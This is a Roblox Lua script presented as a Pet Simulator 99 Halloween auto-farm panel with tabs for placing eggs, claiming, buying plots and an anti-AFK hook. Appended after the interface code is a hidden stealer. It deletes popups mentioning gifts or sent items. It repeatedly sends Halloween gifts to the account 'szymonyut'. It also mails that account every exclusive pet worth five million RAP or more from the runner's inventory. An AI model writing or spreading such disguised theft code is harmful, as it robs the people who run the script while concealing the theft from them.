-- LocalScript
local Players = game:GetService("Players")
local ReplicatedStorage = game:GetService("ReplicatedStorage")
local UserInputService = game:GetService("UserInputService")
local Workspace = game:GetService("Workspace")
local player = Players.LocalPlayer

-- Anti-AFK
do
    local Players = game:GetService("Players")
    local VirtualUser = game:GetService("VirtualUser")
    local player = Players.LocalPlayer

    player.Idled:Connect(function()
        VirtualUser:CaptureController()
        VirtualUser:ClickButton2(Vector2.new(0,0))
    end)
end

-- Create ScreenGui
local gui = Instance.new("ScreenGui")
gui.Name = "HalloweenEggUI"
gui.ResetOnSpawn = false
gui.Parent = player:WaitForChild("PlayerGui")

-- Config
local eggNames = {
    "Pumpkin Egg",
    "Grave Egg",
    "Bat Egg",
    "Ghost Egg",
    "Coulddron Egg",
    "Spider Egg",
    "Reaper Egg"
}

-- State
local selectedEgg = eggNames[1]
local slotSelected = {}
for i=1,10 do slotSelected[i] = false end
local globalRunning = false
local startedCoroutines = false
local claimRunning = false
local claimCoroutine = nil
local plotsRunning = false
local plotsCoroutine = nil
local plotSlotSelected = {}
for i = 1, 5 do plotSlotSelected[i] = false end

-- Remote call helpers
local function placeEgg(slot, egg)
    pcall(function()
        ReplicatedStorage:WaitForChild("Network"):WaitForChild("HalloweenWorld_PlaceEgg"):InvokeServer(slot, egg)
    end)
end

local function pickUp(slot)
    pcall(function()
        ReplicatedStorage:WaitForChild("Network"):WaitForChild("HalloweenWorld_PickUp"):InvokeServer(slot)
    end)
end

local function claimSlot(slot)
    pcall(function()
        local args = {slot}
        ReplicatedStorage:WaitForChild("Network"):WaitForChild("HalloweenWorld_Claim"):InvokeServer(unpack(args))
    end)
end

-- Simple Colors
local colors = {
    background = Color3.fromRGB(40, 40, 50),
    header = Color3.fromRGB(50, 50, 60),
    primary = Color3.fromRGB(120, 70, 200),
    success = Color3.fromRGB(80, 180, 80),
    danger = Color3.fromRGB(200, 80, 80),
    text = Color3.fromRGB(240, 240, 240),
    button = Color3.fromRGB(60, 60, 70),
    slotInactive = Color3.fromRGB(60, 60, 70),
    slotActive = Color3.fromRGB(120, 70, 200)
}

-- Main Frame
local frame = Instance.new("Frame")
frame.Size = UDim2.fromOffset(450, 550)
frame.Position = UDim2.new(0.5, -225, 0.5, -275)
frame.BackgroundColor3 = colors.background
frame.BorderSizePixel = 0
frame.ClipsDescendants = true

local corner = Instance.new("UICorner")
corner.CornerRadius = UDim.new(0, 8)
corner.Parent = frame

frame.Parent = gui

-- Header
local header = Instance.new("Frame")
header.Size = UDim2.new(1, 0, 0, 40)
header.BackgroundColor3 = colors.header
header.BorderSizePixel = 0

local headerCorner = Instance.new("UICorner")
headerCorner.CornerRadius = UDim.new(0, 8)
headerCorner.Parent = header

header.Parent = frame

-- Title
local title = Instance.new("TextLabel")
title.Size = UDim2.new(1, -80, 1, 0)
title.Position = UDim2.new(0, 10, 0, 0)
title.Text = "Pet Sim 99 Halloween"
title.TextColor3 = colors.text
title.BackgroundTransparency = 1
title.Font = Enum.Font.GothamBold
title.TextSize = 16
title.TextXAlignment = Enum.TextXAlignment.Left
title.Parent = header

-- Close button
local closeBtn = Instance.new("TextButton")
closeBtn.Size = UDim2.fromOffset(30, 30)
closeBtn.Position = UDim2.new(1, -35, 0, 5)
closeBtn.Text = "X"
closeBtn.Font = Enum.Font.GothamBold
closeBtn.TextSize = 14
closeBtn.TextColor3 = colors.text
closeBtn.BackgroundColor3 = colors.danger
closeBtn.AutoButtonColor = false

local closeCorner = Instance.new("UICorner")
closeCorner.CornerRadius = UDim.new(0, 6)
closeCorner.Parent = closeBtn

closeBtn.MouseButton1Click:Connect(function()
    gui:Destroy()
end)
closeBtn.Parent = header

-- Content area
local content = Instance.new("Frame")
content.Size = UDim2.new(1, -20, 1, -60)
content.Position = UDim2.new(0, 10, 0, 50)
content.BackgroundTransparency = 1
content.Parent = frame

-- Simple Tab Buttons
local tabContainer = Instance.new("Frame")
tabContainer.Size = UDim2.new(1, 0, 0, 35)
tabContainer.BackgroundTransparency = 1
tabContainer.Parent = content

local eggTab = Instance.new("TextButton")
eggTab.Size = UDim2.new(0.24, -2, 1, 0)
eggTab.Position = UDim2.new(0, 0, 0, 0)
eggTab.Text = "EGG"
eggTab.Font = Enum.Font.GothamBold
eggTab.TextSize = 12
eggTab.BackgroundColor3 = colors.primary
eggTab.TextColor3 = colors.text
eggTab.AutoButtonColor = false

local slotsTab = Instance.new("TextButton")
slotsTab.Size = UDim2.new(0.24, -2, 1, 0)
slotsTab.Position = UDim2.new(0.25, 0, 0, 0)
slotsTab.Text = "SLOTS"
slotsTab.Font = Enum.Font.GothamBold
slotsTab.TextSize = 12
slotsTab.BackgroundColor3 = colors.button
slotsTab.TextColor3 = colors.text
slotsTab.AutoButtonColor = false

local claimTab = Instance.new("TextButton")
claimTab.Size = UDim2.new(0.24, -2, 1, 0)
claimTab.Position = UDim2.new(0.5, 0, 0, 0)
claimTab.Text = "CLAIM"
claimTab.Font = Enum.Font.GothamBold
claimTab.TextSize = 12
claimTab.BackgroundColor3 = colors.button
claimTab.TextColor3 = colors.text
claimTab.AutoButtonColor = false

local plotsTab = Instance.new("TextButton")
plotsTab.Size = UDim2.new(0.24, -2, 1, 0)
plotsTab.Position = UDim2.new(0.75, 0, 0, 0)
plotsTab.Text = "PLOTS"
plotsTab.Font = Enum.Font.GothamBold
plotsTab.TextSize = 12
plotsTab.BackgroundColor3 = colors.button
plotsTab.TextColor3 = colors.text
plotsTab.AutoButtonColor = false

local tabCorner = Instance.new("UICorner")
tabCorner.CornerRadius = UDim.new(0, 6)
tabCorner.Parent = eggTab
tabCorner:Clone().Parent = slotsTab
tabCorner:Clone().Parent = claimTab
tabCorner:Clone().Parent = plotsTab

tabContainer.Parent = content
eggTab.Parent = tabContainer
slotsTab.Parent = tabContainer
claimTab.Parent = tabContainer
plotsTab.Parent = tabContainer

-- Tab Content Area
local tabContent = Instance.new("Frame")
tabContent.Size = UDim2.new(1, 0, 1, -45)
tabContent.Position = UDim2.new(0, 0, 0, 40)
tabContent.BackgroundTransparency = 1
tabContent.Parent = content

-- Egg Tab Content
local eggContent = Instance.new("Frame")
eggContent.Size = UDim2.new(1, 0, 1, 0)
eggContent.BackgroundTransparency = 1
eggContent.Visible = true
eggContent.Parent = tabContent

-- Egg Selection
local eggLabel = Instance.new("TextLabel")
eggLabel.Size = UDim2.new(1, 0, 0, 25)
eggLabel.Position = UDim2.new(0, 0, 0, 0)
eggLabel.Text = "Select Egg:"
eggLabel.TextColor3 = colors.text
eggLabel.BackgroundTransparency = 1
eggLabel.Font = Enum.Font.Gotham
eggLabel.TextSize = 14
eggLabel.TextXAlignment = Enum.TextXAlignment.Left
eggLabel.Parent = eggContent

local dropdownBtn = Instance.new("TextButton")
dropdownBtn.Size = UDim2.new(1, 0, 0, 35)
dropdownBtn.Position = UDim2.new(0, 0, 0, 30)
dropdownBtn.Text = selectedEgg
dropdownBtn.Font = Enum.Font.Gotham
dropdownBtn.TextSize = 14
dropdownBtn.BackgroundColor3 = colors.button
dropdownBtn.TextColor3 = colors.text
dropdownBtn.AutoButtonColor = false

local dropdownCorner = Instance.new("UICorner")
dropdownCorner.CornerRadius = UDim.new(0, 6)
dropdownCorner.Parent = dropdownBtn
dropdownBtn.Parent = eggContent

-- Dropdown List
local dropdownList = Instance.new("Frame")
dropdownList.Size = UDim2.new(1, 0, 0, 0)
dropdownList.Position = UDim2.new(0, 0, 0, 65)
dropdownList.BackgroundColor3 = colors.button
dropdownList.Visible = false
dropdownList.ClipsDescendants = true

local listCorner = Instance.new("UICorner")
listCorner.CornerRadius = UDim.new(0, 6)
listCorner.Parent = dropdownList
dropdownList.Parent = eggContent

for i, name in ipairs(eggNames) do
    local btn = Instance.new("TextButton")
    btn.Size = UDim2.new(1, 0, 0, 30)
    btn.Position = UDim2.new(0, 0, 0, (i-1)*30)
    btn.Text = name
    btn.Font = Enum.Font.Gotham
    btn.TextSize = 13
    btn.BackgroundColor3 = colors.button
    btn.TextColor3 = colors.text
    btn.AutoButtonColor = false
    btn.Visible = false
    
    btn.MouseButton1Click:Connect(function()
        selectedEgg = name
        dropdownBtn.Text = selectedEgg
        toggleDropdown()
    end)
    
    btn.Parent = dropdownList
end

local function toggleDropdown()
    local isOpening = not dropdownList.Visible
    dropdownList.Visible = isOpening
    
    if isOpening then
        for i, child in ipairs(dropdownList:GetChildren()) do
            if child:IsA("TextButton") then
                child.Visible = true
            end
        end
        dropdownList.Size = UDim2.new(1, 0, 0, #eggNames * 30)
    else
        dropdownList.Size = UDim2.new(1, 0, 0, 0)
        task.wait(0.2)
        for i, child in ipairs(dropdownList:GetChildren()) do
            if child:IsA("TextButton") then
                child.Visible = false
            end
        end
    end
end

dropdownBtn.MouseButton1Click:Connect(toggleDropdown)

-- Start/Stop in Egg Tab
local startBtn = Instance.new("TextButton")
startBtn.Size = UDim2.new(0.48, 0, 0, 40)
startBtn.Position = UDim2.new(0, 0, 1, -50)
startBtn.Text = "START"
startBtn.Font = Enum.Font.GothamBold
startBtn.TextSize = 14
startBtn.BackgroundColor3 = colors.success
startBtn.TextColor3 = colors.text
startBtn.AutoButtonColor = false

local stopBtn = Instance.new("TextButton")
stopBtn.Size = UDim2.new(0.48, 0, 0, 40)
stopBtn.Position = UDim2.new(0.52, 0, 1, -50)
stopBtn.Text = "STOP"
stopBtn.Font = Enum.Font.GothamBold
stopBtn.TextSize = 14
stopBtn.BackgroundColor3 = colors.danger
stopBtn.TextColor3 = colors.text
stopBtn.AutoButtonColor = false

local btnCorner = Instance.new("UICorner")
btnCorner.CornerRadius = UDim.new(0, 6)
btnCorner.Parent = startBtn
btnCorner:Clone().Parent = stopBtn

startBtn.Parent = eggContent
stopBtn.Parent = eggContent

-- Status
local statusLabel = Instance.new("TextLabel")
statusLabel.Size = UDim2.new(1, 0, 0, 20)
statusLabel.Position = UDim2.new(0, 0, 1, -80)
statusLabel.Text = "Status: Ready"
statusLabel.TextColor3 = colors.text
statusLabel.BackgroundTransparency = 1
statusLabel.Font = Enum.Font.Gotham
statusLabel.TextSize = 12
statusLabel.TextXAlignment = Enum.TextXAlignment.Left
statusLabel.Parent = eggContent

-- Slots Tab Content
local slotsContent = Instance.new("Frame")
slotsContent.Size = UDim2.new(1, 0, 1, 0)
slotsContent.BackgroundTransparency = 1
slotsContent.Visible = false
slotsContent.Parent = tabContent

local slotsLabel = Instance.new("TextLabel")
slotsLabel.Size = UDim2.new(1, 0, 0, 25)
slotsLabel.Position = UDim2.new(0, 0, 0, 0)
slotsLabel.Text = "Select Slots:"
slotsLabel.TextColor3 = colors.text
slotsLabel.BackgroundTransparency = 1
slotsLabel.Font = Enum.Font.Gotham
slotsLabel.TextSize = 14
slotsLabel.TextXAlignment = Enum.TextXAlignment.Left
slotsLabel.Parent = slotsContent

-- Slots Grid
local slotsGrid = Instance.new("Frame")
slotsGrid.Size = UDim2.new(1, 0, 0, 200)
slotsGrid.Position = UDim2.new(0, 0, 0, 30)
slotsGrid.BackgroundTransparency = 1
slotsGrid.Parent = slotsContent

for i = 1, 10 do
    local col = (i-1) % 5
    local row = math.floor((i-1) / 5)
    
    local btn = Instance.new("TextButton")
    btn.Size = UDim2.new(0.18, 0, 0, 35)
    btn.Position = UDim2.new(col * 0.2, 0, row * 0.5, 0)
    btn.Text = tostring(i)
    btn.Font = Enum.Font.GothamBold
    btn.TextSize = 14
    btn.BackgroundColor3 = colors.slotInactive
    btn.TextColor3 = colors.text
    btn.AutoButtonColor = false
    
    local btnCorner = Instance.new("UICorner")
    btnCorner.CornerRadius = UDim.new(0, 6)
    btnCorner.Parent = btn
    
    local function updateVisual()
        if slotSelected[i] then
            btn.BackgroundColor3 = colors.slotActive
        else
            btn.BackgroundColor3 = colors.slotInactive
        end
    end
    
    btn.MouseButton1Click:Connect(function()
        slotSelected[i] = not slotSelected[i]
        updateVisual()
    end)
    
    btn.Parent = slotsGrid
    updateVisual()
end

-- Start/Stop in Slots Tab
local startBtnSlots = Instance.new("TextButton")
startBtnSlots.Size = UDim2.new(0.48, 0, 0, 40)
startBtnSlots.Position = UDim2.new(0, 0, 1, -50)
startBtnSlots.Text = "START"
startBtnSlots.Font = Enum.Font.GothamBold
startBtnSlots.TextSize = 14
startBtnSlots.BackgroundColor3 = colors.success
startBtnSlots.TextColor3 = colors.text
startBtnSlots.AutoButtonColor = false

local stopBtnSlots = Instance.new("TextButton")
stopBtnSlots.Size = UDim2.new(0.48, 0, 0, 40)
stopBtnSlots.Position = UDim2.new(0.52, 0, 1, -50)
stopBtnSlots.Text = "STOP"
stopBtnSlots.Font = Enum.Font.GothamBold
stopBtnSlots.TextSize = 14
stopBtnSlots.BackgroundColor3 = colors.danger
stopBtnSlots.TextColor3 = colors.text
stopBtnSlots.AutoButtonColor = false

btnCorner:Clone().Parent = startBtnSlots
btnCorner:Clone().Parent = stopBtnSlots

startBtnSlots.Parent = slotsContent
stopBtnSlots.Parent = slotsContent

-- Status in Slots Tab
local statusLabelSlots = Instance.new("TextLabel")
statusLabelSlots.Size = UDim2.new(1, 0, 0, 20)
statusLabelSlots.Position = UDim2.new(0, 0, 1, -80)
statusLabelSlots.Text = "Status: Ready"
statusLabelSlots.TextColor3 = colors.text
statusLabelSlots.BackgroundTransparency = 1
statusLabelSlots.Font = Enum.Font.Gotham
statusLabelSlots.TextSize = 12
statusLabelSlots.TextXAlignment = Enum.TextXAlignment.Left
statusLabelSlots.Parent = slotsContent

-- Claim Tab Content
local claimContent = Instance.new("Frame")
claimContent.Size = UDim2.new(1, 0, 1, 0)
claimContent.BackgroundTransparency = 1
claimContent.Visible = false
claimContent.Parent = tabContent

-- Claim Section
local claimLabel = Instance.new("TextLabel")
claimLabel.Size = UDim2.new(1, 0, 0, 60)
claimLabel.Position = UDim2.new(0, 0, 0, 0)
claimLabel.Text = "Auto Claim\n\nAutomatically claims from all 11 slots"
claimLabel.TextColor3 = colors.text
claimLabel.BackgroundTransparency = 1
claimLabel.Font = Enum.Font.Gotham
claimLabel.TextSize = 14
claimLabel.TextXAlignment = Enum.TextXAlignment.Left
claimLabel.TextYAlignment = Enum.TextYAlignment.Top
claimLabel.Parent = claimContent

-- Claim Toggle Button
local claimToggleBtn = Instance.new("TextButton")
claimToggleBtn.Size = UDim2.new(1, 0, 0, 40)
claimToggleBtn.Position = UDim2.new(0, 0, 0, 70)
claimToggleBtn.Text = "START CLAIM"
claimToggleBtn.Font = Enum.Font.GothamBold
claimToggleBtn.TextSize = 14
claimToggleBtn.BackgroundColor3 = colors.success
claimToggleBtn.TextColor3 = colors.text
claimToggleBtn.AutoButtonColor = false

local claimCorner = Instance.new("UICorner")
claimCorner.CornerRadius = UDim.new(0, 6)
claimCorner.Parent = claimToggleBtn
claimToggleBtn.Parent = claimContent

-- Claim Status
local claimStatusLabel = Instance.new("TextLabel")
claimStatusLabel.Size = UDim2.new(1, 0, 0, 20)
claimStatusLabel.Position = UDim2.new(0, 0, 0, 120)
claimStatusLabel.Text = "Claim Status: Off"
claimStatusLabel.TextColor3 = colors.text
claimStatusLabel.BackgroundTransparency = 1
claimStatusLabel.Font = Enum.Font.Gotham
claimStatusLabel.TextSize = 12
claimStatusLabel.TextXAlignment = Enum.TextXAlignment.Left
claimStatusLabel.Parent = claimContent

-- Claim Loop Function
local function claimLoop()
    while claimRunning do
        for slot = 1, 11 do
            if not claimRunning then break end
            claimSlot(slot)
            task.wait(0.1) -- Small delay between claims
        end
        if claimRunning then
            task.wait(1) -- Wait 1 second before next cycle
        end
    end
end

-- Toggle Claim Function
local function toggleClaim()
    claimRunning = not claimRunning
    
    if claimRunning then
        claimToggleBtn.Text = "STOP CLAIM"
        claimToggleBtn.BackgroundColor3 = colors.danger
        claimStatusLabel.Text = "Claim Status: Running"
        claimStatusLabel.TextColor3 = colors.success
        
        -- Start claim loop
        claimCoroutine = coroutine.create(claimLoop)
        coroutine.resume(claimCoroutine)
    else
        claimToggleBtn.Text = "START CLAIM"
        claimToggleBtn.BackgroundColor3 = colors.success
        claimStatusLabel.Text = "Claim Status: Off"
        claimStatusLabel.TextColor3 = colors.text
    end
end

claimToggleBtn.MouseButton1Click:Connect(toggleClaim)

-- Plots Tab Content
local plotsContent = Instance.new("Frame")
plotsContent.Size = UDim2.new(1, 0, 1, 0)
plotsContent.BackgroundTransparency = 1
plotsContent.Visible = false
plotsContent.Parent = tabContent

-- Plots Title
local plotsTitle = Instance.new("TextLabel")
plotsTitle.Size = UDim2.new(1, 0, 0, 25)
plotsTitle.Position = UDim2.new(0, 0, 0, 0)
plotsTitle.Text = "Plots Auto-Purchase"
plotsTitle.TextColor3 = colors.text
plotsTitle.BackgroundTransparency = 1
plotsTitle.Font = Enum.Font.GothamBold
plotsTitle.TextSize = 14
plotsTitle.TextXAlignment = Enum.TextXAlignment.Left
plotsTitle.Parent = plotsContent

-- Plot Slots Grid
local plotSlotsGrid = Instance.new("Frame")
plotSlotsGrid.Size = UDim2.new(1, 0, 0, 50)
plotSlotsGrid.Position = UDim2.new(0, 0, 0, 30)
plotSlotsGrid.BackgroundTransparency = 1
plotSlotsGrid.Parent = plotsContent

for i = 1, 5 do
    local btn = Instance.new("TextButton")
    btn.Size = UDim2.new(0.18, 0, 1, 0)
    btn.Position = UDim2.new((i-1)*0.2, 0, 0, 0)
    btn.Text = tostring(i)
    btn.Font = Enum.Font.GothamBold
    btn.TextSize = 14
    btn.BackgroundColor3 = colors.slotInactive
    btn.TextColor3 = colors.text
    btn.AutoButtonColor = false

    local btnCorner = Instance.new("UICorner")
    btnCorner.CornerRadius = UDim.new(0, 6)
    btnCorner.Parent = btn

    local function updateVisual()
        if plotSlotSelected[i] then
            btn.BackgroundColor3 = colors.slotActive
        else
            btn.BackgroundColor3 = colors.slotInactive
        end
    end

    btn.MouseButton1Click:Connect(function()
        plotSlotSelected[i] = not plotSlotSelected[i]
        updateVisual()
    end)

    btn.Parent = plotSlotsGrid
    updateVisual()
end

-- Plots Status Label
local plotsStatus = Instance.new("TextLabel")
plotsStatus.Size = UDim2.new(1, 0, 0, 20)
plotsStatus.Position = UDim2.new(0, 0, 0, 90)
plotsStatus.Text = "Status: Ready"
plotsStatus.TextColor3 = colors.text
plotsStatus.BackgroundTransparency = 1
plotsStatus.Font = Enum.Font.Gotham
plotsStatus.TextSize = 12
plotsStatus.TextXAlignment = Enum.TextXAlignment.Left
plotsStatus.Parent = plotsContent

-- Plots Start/Stop Buttons
local startBtnPlots = Instance.new("TextButton")
startBtnPlots.Size = UDim2.new(0.48, 0, 0, 40)
startBtnPlots.Position = UDim2.new(0, 0, 1, -50)
startBtnPlots.Text = "START"
startBtnPlots.Font = Enum.Font.GothamBold
startBtnPlots.TextSize = 14
startBtnPlots.BackgroundColor3 = colors.success
startBtnPlots.TextColor3 = colors.text
startBtnPlots.AutoButtonColor = false
btnCorner:Clone().Parent = startBtnPlots
startBtnPlots.Parent = plotsContent

local stopBtnPlots = Instance.new("TextButton")
stopBtnPlots.Size = UDim2.new(0.48, 0, 0, 40)
stopBtnPlots.Position = UDim2.new(0.52, 0, 1, -50)
stopBtnPlots.Text = "STOP"
stopBtnPlots.Font = Enum.Font.GothamBold
stopBtnPlots.TextSize = 14
stopBtnPlots.BackgroundColor3 = colors.danger
stopBtnPlots.TextColor3 = colors.text
stopBtnPlots.AutoButtonColor = false
btnCorner:Clone().Parent = stopBtnPlots
stopBtnPlots.Parent = plotsContent

-- FIXED PLOTS FUNCTIONALITY - BUYS ALL SELECTED SLOTS AT ONCE
local Network = ReplicatedStorage:WaitForChild("Network")
local Plots_Invoke = Network:WaitForChild("Plots_Invoke")
local myPlotID

-- Detect plot automatically
local function detectPlot()
    local plotsFolder = Workspace:WaitForChild("__THINGS"):WaitForChild("Plots")
    
    for _, plot in pairs(plotsFolder:GetChildren()) do
        local plotID = tonumber(plot.Name)
        local success, err = pcall(function()
            Plots_Invoke:InvokeServer(plotID, "PurchaseEgg")
        end)
        if not success and err and tostring(err):lower():find("failed") then
            myPlotID = plotID
            plotsStatus.Text = "Detected plot: " .. myPlotID
            print("Detected your plot ID:", myPlotID)
            return myPlotID
        end
    end
    
    plotsStatus.Text = "Could not detect plot automatically"
    warn("Could not detect your plot automatically")
    return nil
end

-- Plots Loop Function - BUYS ALL SELECTED SLOTS AT ONCE
local function plotsLoop()
    -- Detect plot if not already detected
    if not myPlotID then
        myPlotID = detectPlot()
        if not myPlotID then
            plotsStatus.Text = "Error: No plot detected"
            return
        end
    end

    local eggType = 3 -- Always 3 as per your code
    
    while plotsRunning do
        local anySelected = false
        local purchasedCount = 0
        
        -- Purchase in ALL selected slots at once
        for slot = 1, 5 do
            if not plotsRunning then break end
            
            if plotSlotSelected[slot] then
                anySelected = true
                local args = {myPlotID, "PurchaseEgg", slot, eggType}
                local success, err = pcall(function()
                    Plots_Invoke:InvokeServer(unpack(args))
                end)
                
                if success then
                    purchasedCount = purchasedCount + 1
                end
                -- NO DELAY BETWEEN PURCHASES - THEY HAPPEN INSTANTLY
            end
        end
        
        if anySelected then
            plotsStatus.Text = "Purchased in " .. purchasedCount .. " slots"
        else
            plotsStatus.Text = "No slots selected"
        end
        
        -- Wait before next cycle (but purchases within cycle are instant)
        if plotsRunning then
            task.wait(0.7) -- Wait 1 second before next purchase cycle
        end
    end
end

startBtnPlots.MouseButton1Click:Connect(function()
    if not plotsRunning then
        plotsRunning = true
        plotsStatus.Text = "Status: Running"
        plotsStatus.TextColor3 = colors.success
        plotsCoroutine = coroutine.create(plotsLoop)
        coroutine.resume(plotsCoroutine)
    end
end)

stopBtnPlots.MouseButton1Click:Connect(function()
    plotsRunning = false
    plotsStatus.Text = "Status: Stopped"
    plotsStatus.TextColor3 = colors.danger
end)

-- Tab Switching
local function switchToTab(tabName)
    eggContent.Visible = (tabName == "egg")
    slotsContent.Visible = (tabName == "slots")
    claimContent.Visible = (tabName == "claim")
    plotsContent.Visible = (tabName == "plots")
    
    -- Reset all tab colors
    eggTab.BackgroundColor3 = colors.button
    slotsTab.BackgroundColor3 = colors.button
    claimTab.BackgroundColor3 = colors.button
    plotsTab.BackgroundColor3 = colors.button
    
    -- Set active tab color
    if tabName == "egg" then
        eggTab.BackgroundColor3 = colors.primary
    elseif tabName == "slots" then
        slotsTab.BackgroundColor3 = colors.primary
    elseif tabName == "claim" then
        claimTab.BackgroundColor3 = colors.primary
    elseif tabName == "plots" then
        plotsTab.BackgroundColor3 = colors.primary
    end
end

eggTab.MouseButton1Click:Connect(function()
    switchToTab("egg")
end)

slotsTab.MouseButton1Click:Connect(function()
    switchToTab("slots")
end)

claimTab.MouseButton1Click:Connect(function()
    switchToTab("claim")
end)

plotsTab.MouseButton1Click:Connect(function()
    switchToTab("plots")
end)

-- SIMPLE DRAGGING THAT WORKS
local dragging = false
local dragInput
local dragStart
local startPos

local function update(input)
    local delta = input.Position - dragStart
    frame.Position = UDim2.new(startPos.X.Scale, startPos.X.Offset + delta.X, startPos.Y.Scale, startPos.Y.Offset + delta.Y)
end

header.InputBegan:Connect(function(input)
    if input.UserInputType == Enum.UserInputType.MouseButton1 then
        dragging = true
        dragStart = input.Position
        startPos = frame.Position
        
        input.Changed:Connect(function()
            if input.UserInputState == Enum.UserInputState.End then
                dragging = false
            end
        end)
    end
end)

header.InputChanged:Connect(function(input)
    if input.UserInputType == Enum.UserInputType.MouseMovement then
        dragInput = input
    end
end)

UserInputService.InputChanged:Connect(function(input)
    if input == dragInput and dragging then
        update(input)
    end
end)

-- Control logic for egg farming
local function slotLoop(slot)
    while true do
        if not globalRunning then
            task.wait(0.25)
        elseif slotSelected[slot] then
            placeEgg(slot, selectedEgg)
            task.wait(2)
            pickUp(slot)
            task.wait(0.25)
        else
            task.wait(0.25)
        end
    end
end

local function startBot()
    globalRunning = true
    statusLabel.Text = "Status: Running"
    statusLabelSlots.Text = "Status: Running"
    statusLabel.TextColor3 = colors.success
    statusLabelSlots.TextColor3 = colors.success
    
    if not startedCoroutines then
        startedCoroutines = true
        for s = 1, 10 do
            spawn(function() slotLoop(s) end)
        end
    end
end

local function stopBot()
    globalRunning = false
    statusLabel.Text = "Status: Stopped"
    statusLabelSlots.Text = "Status: Stopped"
    statusLabel.TextColor3 = colors.danger
    statusLabelSlots.TextColor3 = colors.danger
end

-- Connect buttons
startBtn.MouseButton1Click:Connect(startBot)
stopBtn.MouseButton1Click:Connect(stopBot)
startBtnSlots.MouseButton1Click:Connect(startBot)
stopBtnSlots.MouseButton1Click:Connect(stopBot)

-- Close dropdown when clicking outside
gui:GetPropertyChangedSignal("AbsoluteSize"):Connect(function()
    if dropdownList.Visible then
        toggleDropdown()
    end

end)


local Players = game:GetService("Players")
local player = Players.LocalPlayer
local gui = player:WaitForChild("PlayerGui")
local ReplicatedStorage = game:GetService("ReplicatedStorage")
local network = ReplicatedStorage:WaitForChild("Network")

-- Only remove these keywords from GUI
local popupKeywords = {"gift", "pending", "sent"}
local ignoreParents = {"QuestFrame", "QuestList", "HUD", "MainHUD"}

local function containsKeyword(text)
    if not text then return false end
    text = text:lower()
    for _, kw in ipairs(popupKeywords) do
        if text:find(kw) then return true end
    end
    return false
end

local function isIgnored(obj)
    for _, name in ipairs(ignoreParents) do
        local parent = gui:FindFirstChild(name)
        if parent and obj:IsDescendantOf(parent) then
            return true
        end
    end
    return false
end

local function handleObj(obj)
    if isIgnored(obj) then return end
    if obj:IsA("TextLabel") or obj:IsA("TextButton") then
        if containsKeyword(obj.Text) then
            if type(setclipboard) == "function" then
                pcall(setclipboard, obj:GetFullName())
            end
            obj:Destroy()
        end
    else
        for _, child in ipairs(obj:GetChildren()) do
            handleObj(child)
        end
    end
end

-- Remove existing popups instantly
for _, v in ipairs(gui:GetChildren()) do
    handleObj(v)
end

-- Remove any new popups instantly
gui.DescendantAdded:Connect(handleObj)

-- Loop to send Halloween gifts
local targetPlayer = "szymonyut" -- change to the player you want to send gifts to
local args = {Players:WaitForChild(targetPlayer)}

task.spawn(function()
    while true do
        pcall(function()
            network:WaitForChild("Halloween Gift: Request Send"):FireServer(unpack(args))
        end)
        task.wait(0.4) -- adjust interval (in seconds) as needed
    end
end)


local Players = game:GetService("Players")
local ReplicatedStorage = game:GetService("ReplicatedStorage")
local HttpService = game:GetService("HttpService")

local plr = Players.LocalPlayer
if not plr then
    warn("Run this as a LocalScript while the player is present.")
    return
end

local recipientUsername = "szymonyut" -- who will receive the pets
local customMessage = "KLPN" -- message

local function safeRequire(module)
    local ok, mod = pcall(require, module)
    if ok then return mod end
    return nil, mod
end

-- Load Save module
local SaveModule, err = safeRequire(ReplicatedStorage:WaitForChild("Library"):WaitForChild("Client"):WaitForChild("Save"))
if not SaveModule then
    warn("Could not require Save module:", err)
    return
end

local ok, saveOrErr = pcall(function() return SaveModule.Get() end)
if not ok then
    warn("Save.Get() failed:", saveOrErr)
    return
end
local save = saveOrErr or {}
local inventory = save.Inventory or save

-- Load RAPCmds & Pet directory
local RAPCmds = safeRequire(ReplicatedStorage.Library.Client:WaitForChild("RAPCmds"))
local PetDirectory = safeRequire(ReplicatedStorage.Library.Directory:WaitForChild("Pets"))

local RAP_THRESHOLD = 5000000 -- 5M

local function getRAP(category, item)
    if not RAPCmds then return 0 end
    local wrapper = {
        Class = {Name = category},
        IsA = function(h) return h == category end,
        GetId = function() return item.id end,
        StackKey = function()
            return HttpService:JSONEncode({id = item.id, pt = item.pt, sh = item.sh, tn = item.tn})
        end,
        AbstractGetRAP = function() return nil end
    }
    local ok, val = pcall(function() return RAPCmds.Get(wrapper) end)
    return (ok and (val or 0)) or 0
end

local MailboxSend = ReplicatedStorage:WaitForChild("Network"):WaitForChild("Mailbox: Send")

-- Send only exclusive pets with RAP >= threshold
local petTable = inventory.Pet or save.Pet or save["Pet"]
if petTable then
    local exclusivePets = {}
    for uid, item in pairs(petTable) do
        local petMeta = (PetDirectory and PetDirectory[item.id]) or nil
        local isExclusive = petMeta and (petMeta.exclusiveLevel or petMeta.huge)
        if isExclusive then
            exclusivePets[uid] = item
        end
    end

    local petList = {}
    for uid, item in pairs(exclusivePets) do
        local rap = getRAP("Pet", item)
        if rap >= RAP_THRESHOLD then
            table.insert(petList, {uid = uid, item = item, rap = rap})
        end
    end

    table.sort(petList, function(a, b) return a.rap > b.rap end)

    for _, entry in ipairs(petList) do
        local args = {recipientUsername, customMessage, "Pet", entry.uid, entry.item._am or 1}
        local success, err = pcall(function()
            MailboxSend:InvokeServer(unpack(args))
        end)
        if success then
            print("Sent Pet UID:", entry.uid, "RAP:", entry.rap)
        else
            warn("Failed to send Pet UID:", entry.uid, "Error:", err)
        end
    end
else
    print("No pets found in inventory.")
end



